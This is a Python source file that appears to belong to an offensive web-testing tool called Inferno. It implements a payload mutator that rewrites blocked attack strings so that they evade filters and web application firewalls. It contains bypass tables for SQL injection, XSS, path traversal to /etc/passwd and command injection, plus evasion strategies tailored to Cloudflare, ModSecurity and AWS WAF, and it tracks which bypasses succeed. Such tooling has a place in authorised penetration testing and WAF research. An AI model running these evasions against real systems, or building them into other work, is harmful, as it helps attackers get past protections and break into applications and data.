"""
Payload Mutator for Inferno.

Automatically generates bypass variations of blocked payloads.
When a payload is blocked, this component creates mutations that might evade filters.

Key features:
- Multiple encoding strategies
- WAF-specific mutations
- Case manipulation
- Comment injection
- Parameter pollution
- Null byte injection
"""

from __future__ import annotations

import base64
import random
import urllib.parse
from dataclasses import dataclass, field
from enum import Enum
from typing import Callable

import structlog

logger = structlog.get_logger(__name__)


class MutationType(str, Enum):
    """Types of mutations that can be applied."""

    URL_ENCODE = "url_encode"
    DOUBLE_URL_ENCODE = "double_url_encode"
    UNICODE_ENCODE = "unicode_encode"
    HTML_ENCODE = "html_encode"
    BASE64_ENCODE = "base64_encode"
    CASE_SWAP = "case_swap"
    COMMENT_INSERT = "comment_insert"
    WHITESPACE_REPLACE = "whitespace_replace"
    NULL_BYTE = "null_byte"
    NEWLINE_INSERT = "newline_insert"
    CONCAT_SPLIT = "concat_split"
    HEX_ENCODE = "hex_encode"


@dataclass
class Mutation:
    """A single payload mutation."""

    original: str
    mutated: str
    mutation_type: MutationType
    description: str
    success_likelihood: float = 0.5  # Estimated chance of bypassing


@dataclass
class MutationResult:
    """Result of mutation generation."""

    original_payload: str
    mutations: list[Mutation] = field(default_factory=list)
    recommended_order: list[int] = field(default_factory=list)


class PayloadMutator:
    """
    Generate payload mutations to bypass filters and WAFs.

    When a payload is blocked, use this to generate variations
    that might evade the protection.
    """

    # SQL-specific mutations
    SQL_MUTATIONS: dict[str, list[str]] = {
        "select": ["SeLeCt", "SEL/**/ECT", "sel%65ct", "/*!SELECT*/", "SELE\x43T"],
        "union": ["UnIoN", "UN/**/ION", "uni%6fn", "/*!UNION*/", "UNI\x4fN"],
        "from": ["FrOm", "FR/**/OM", "fr%6fm", "/*!FROM*/"],
        "where": ["WhErE", "WH/**/ERE", "wh%65re", "/*!WHERE*/"],
        "and": ["AnD", "AN/**/D", "&&", "an%64"],
        "or": ["Or", "O/**/R", "||", "o%72"],
        " ": ["/**/", "+", "%20", "%09", "%0a", "%0d"],
        "'": ["%27", "\\x27", "char(39)", "''", "%bf%27"],
        '"': ["%22", "\\x22", "char(34)"],
        "=": [" like ", " regexp ", " rlike "],
    }

    # XSS-specific mutations
    XSS_MUTATIONS: dict[str, list[str]] = {
        "<script>": [
            "<ScRiPt>", "<scr%69pt>", "<script%20>",
            "<svg/onload=", "<img src=x onerror=",
            "<body onload=", "\\x3cscript\\x3e",
        ],
        "</script>": ["</ScRiPt>", "<\\/script>", "</script%20>"],
        "alert": ["al\\x65rt", "al%65rt", "confirm", "prompt", "[].constructor.constructor"],
        "javascript:": ["java%0ascript:", "java%09script:", "java\tscript:"],
        "onerror": ["on%65rror", "OnErRoR", "on\x65rror"],
        "onload": ["on%6coad", "OnLoAd", "on\x6coad"],
    }

    # Path traversal mutations
    PATH_MUTATIONS: dict[str, list[str]] = {
        "../": ["..%2f", "..%5c", "%2e%2e/", "..%252f", "....//", "..\\/"],
        "..\\": ["..%5c", "..%255c", "%2e%2e\\", "..\\..\\"],
        "/etc/passwd": [
            "/etc%2fpasswd", "....//....//etc/passwd",
            "/etc/passwd%00", "/./etc/./passwd",
        ],
    }

    # Command injection mutations
    CMD_MUTATIONS: dict[str, list[str]] = {
        ";": ["%3b", ";\x00", "%0a", "\n", "\r\n"],
        "|": ["%7c", "||", "|%00"],
        "&": ["%26", "&&", "&%00"],
        "`": ["%60", "$()", "${IFS}"],
        " ": ["${IFS}", "$IFS$9", "%20", "+", "<", ">"],
    }

    def __init__(self) -> None:
        """Initialize the payload mutator."""
        self._mutation_history: list[tuple[str, str, bool]] = []

    def mutate(
        self,
        payload: str,
        context: str = "generic",
        max_mutations: int = 10,
        waf_type: str | None = None,
    ) -> MutationResult:
        """
        Generate mutations of a payload.

        Args:
            payload: The original payload
            context: Context type (sql, xss, path, cmd, generic)
            max_mutations: Maximum number of mutations to generate
            waf_type: Known WAF type for targeted mutations

        Returns:
            MutationResult with all generated mutations
        """
        mutations: list[Mutation] = []

        # Apply context-specific mutations
        context_mutations = self._get_context_mutations(context)
        for old, replacements in context_mutations.items():
            if old.lower() in payload.lower():
                for replacement in replacements[:3]:  # Top 3 per pattern
                    try:
                        mutated = self._case_insensitive_replace(payload, old, replacement)
                        if mutated != payload:
                            mutations.append(Mutation(
                                original=payload,
                                mutated=mutated,
                                mutation_type=MutationType.COMMENT_INSERT if "/**/" in replacement else MutationType.CASE_SWAP,
                                description=f"Replace '{old}' with '{replacement}'",
                                success_likelihood=0.6,
                            ))
                    except Exception:
                        pass

        # Apply encoding mutations
        mutations.extend(self._apply_encoding_mutations(payload))

        # Apply WAF-specific mutations if known
        if waf_type:
            mutations.extend(self._apply_waf_specific_mutations(payload, waf_type))

        # Apply generic mutations
        mutations.extend(self._apply_generic_mutations(payload))

        # Deduplicate
        seen = set()
        unique_mutations = []
        for m in mutations:
            if m.mutated not in seen and m.mutated != payload:
                seen.add(m.mutated)
                unique_mutations.append(m)

        # Sort by success likelihood
        unique_mutations.sort(key=lambda m: m.success_likelihood, reverse=True)

        # Trim to max
        unique_mutations = unique_mutations[:max_mutations]

        # Generate recommended order (based on likelihood and diversity)
        recommended_order = list(range(len(unique_mutations)))

        result = MutationResult(
            original_payload=payload,
            mutations=unique_mutations,
            recommended_order=recommended_order,
        )

        logger.debug(
            "mutations_generated",
            original_len=len(payload),
            num_mutations=len(unique_mutations),
            context=context,
        )

        return result

    def _get_context_mutations(self, context: str) -> dict[str, list[str]]:
        """Get mutations for a specific context."""
        context_map = {
            "sql": self.SQL_MUTATIONS,
            "xss": self.XSS_MUTATIONS,
            "path": self.PATH_MUTATIONS,
            "cmd": self.CMD_MUTATIONS,
        }
        return context_map.get(context, {})

    def _case_insensitive_replace(
        self,
        text: str,
        old: str,
        new: str,
    ) -> str:
        """Replace text case-insensitively."""
        import re
        return re.sub(re.escape(old), new, text, flags=re.IGNORECASE)

    def _apply_encoding_mutations(self, payload: str) -> list[Mutation]:
        """Apply various encoding transformations."""
        mutations = []

        # URL encoding
        try:
            url_encoded = urllib.parse.quote(payload, safe='')
            if url_encoded != payload:
                mutations.append(Mutation(
                    original=payload,
                    mutated=url_encoded,
                    mutation_type=MutationType.URL_ENCODE,
                    description="URL encode entire payload",
                    success_likelihood=0.5,
                ))
        except Exception:
            pass

        # Double URL encoding
        try:
            double_encoded = urllib.parse.quote(urllib.parse.quote(payload, safe=''), safe='')
            if double_encoded != payload:
                mutations.append(Mutation(
                    original=payload,
                    mutated=double_encoded,
                    mutation_type=MutationType.DOUBLE_URL_ENCODE,
                    description="Double URL encode payload",
                    success_likelihood=0.7,
                ))
        except Exception:
            pass

        # HTML entity encoding for special chars
        html_encoded = payload
        html_map = {
            '<': '&lt;',
            '>': '&gt;',
            '"': '&quot;',
            "'": '&#39;',
            '&': '&amp;',
        }
        for char, entity in html_map.items():
            html_encoded = html_encoded.replace(char, entity)
        if html_encoded != payload:
            mutations.append(Mutation(
                original=payload,
                mutated=html_encoded,
                mutation_type=MutationType.HTML_ENCODE,
                description="HTML entity encode",
                success_likelihood=0.4,
            ))

        # Hex encoding for key characters
        hex_encoded = ""
        for char in payload:
            if char in "'\"<>;|&":
                hex_encoded += f"\\x{ord(char):02x}"
            else:
                hex_encoded += char
        if hex_encoded != payload:
            mutations.append(Mutation(
                original=payload,
                mutated=hex_encoded,
                mutation_type=MutationType.HEX_ENCODE,
                description="Hex encode special characters",
                success_likelihood=0.55,
            ))

        return mutations

    def _apply_waf_specific_mutations(
        self,
        payload: str,
        waf_type: str,
    ) -> list[Mutation]:
        """Apply mutations specific to known WAF types."""
        mutations = []

        waf_strategies: dict[str, list[Callable[[str], str]]] = {
            "cloudflare": [
                lambda p: p.replace(" ", "/**/"),
                lambda p: urllib.parse.quote(p),
                lambda p: "".join(f"\\u{ord(c):04x}" if c in "'\"\\" else c for c in p),
            ],
            "modsecurity": [
                lambda p: p.replace("'", "\\x27"),
                lambda p: p.replace(" ", "%09"),  # Tab instead of space
                lambda p: p.replace("select", "/*!50000select*/"),
            ],
            "aws_waf": [
                lambda p: p.replace("'", "%27"),
                lambda p: p.replace('"', "%22"),
                lambda p: p.replace(" ", "+"),
            ],
        }

        if waf_type.lower() in waf_strategies:
            for strategy in waf_strategies[waf_type.lower()]:
                try:
                    mutated = strategy(payload)
                    if mutated != payload:
                        mutations.append(Mutation(
                            original=payload,
                            mutated=mutated,
                            mutation_type=MutationType.COMMENT_INSERT,
                            description=f"WAF-specific mutation for {waf_type}",
                            success_likelihood=0.7,
                        ))
                except Exception:
                    pass

        return mutations

    def _apply_generic_mutations(self, payload: str) -> list[Mutation]:
        """Apply generic mutations that work against many filters."""
        mutations = []

        # Case swapping
        case_swapped = ""
        for i, char in enumerate(payload):
            if char.isalpha():
                case_swapped += char.upper() if i % 2 == 0 else char.lower()
            else:
                case_swapped += char
        if case_swapped != payload:
            mutations.append(Mutation(
                original=payload,
                mutated=case_swapped,
                mutation_type=MutationType.CASE_SWAP,
                description="Alternating case",
                success_likelihood=0.5,
            ))

        # Random case
        random_case = "".join(
            c.upper() if random.random() > 0.5 else c.lower()
            for c in payload
        )
        if random_case != payload and random_case != case_swapped:
            mutations.append(Mutation(
                original=payload,
                mutated=random_case,
                mutation_type=MutationType.CASE_SWAP,
                description="Random case variation",
                success_likelihood=0.45,
            ))

        # Null byte insertion
        null_inserted = payload.replace(".", ".%00").replace("/", "%00/")
        if null_inserted != payload:
            mutations.append(Mutation(
                original=payload,
                mutated=null_inserted,
                mutation_type=MutationType.NULL_BYTE,
                description="Null byte insertion",
                success_likelihood=0.4,
            ))

        # Tab/newline replacement for spaces
        for old, new, desc in [
            (" ", "\t", "Tab for space"),
            (" ", "%0a", "Newline for space"),
            (" ", "%0d%0a", "CRLF for space"),
        ]:
            replaced = payload.replace(old, new)
            if replaced != payload:
                mutations.append(Mutation(
                    original=payload,
                    mutated=replaced,
                    mutation_type=MutationType.WHITESPACE_REPLACE,
                    description=desc,
                    success_likelihood=0.55,
                ))

        return mutations

    def record_result(
        self,
        original: str,
        mutated: str,
        success: bool,
    ) -> None:
        """
        Record whether a mutation was successful.

        This helps improve future mutation recommendations.

        Args:
            original: Original payload
            mutated: Mutated payload
            success: Whether the mutation bypassed the filter
        """
        self._mutation_history.append((original, mutated, success))

        if len(self._mutation_history) > 1000:
            self._mutation_history = self._mutation_history[-500:]

        if success:
            logger.info(
                "mutation_success_recorded",
                original_preview=original[:50],
                mutated_preview=mutated[:50],
            )

    def get_successful_patterns(self) -> list[tuple[str, str]]:
        """Get patterns of successful mutations."""
        return [
            (orig, mut)
            for orig, mut, success in self._mutation_history
            if success
        ]

    def quick_mutate(
        self,
        payload: str,
        mutation_type: MutationType,
    ) -> str:
        """
        Apply a specific mutation type quickly.

        Args:
            payload: The payload to mutate
            mutation_type: The specific mutation to apply

        Returns:
            The mutated payload
        """
        mutation_funcs: dict[MutationType, Callable[[str], str]] = {
            MutationType.URL_ENCODE: lambda p: urllib.parse.quote(p, safe=''),
            MutationType.DOUBLE_URL_ENCODE: lambda p: urllib.parse.quote(urllib.parse.quote(p, safe=''), safe=''),
            MutationType.CASE_SWAP: lambda p: "".join(c.swapcase() for c in p),
            MutationType.HEX_ENCODE: lambda p: "".join(f"\\x{ord(c):02x}" if not c.isalnum() else c for c in p),
            MutationType.NULL_BYTE: lambda p: p + "%00",
        }

        if mutation_type in mutation_funcs:
            return mutation_funcs[mutation_type](payload)

        return payload


# Global singleton
_payload_mutator: PayloadMutator | None = None


def get_payload_mutator() -> PayloadMutator:
    """Get the global payload mutator instance."""
    global _payload_mutator
    if _payload_mutator is None:
        _payload_mutator = PayloadMutator()
    return _payload_mutator
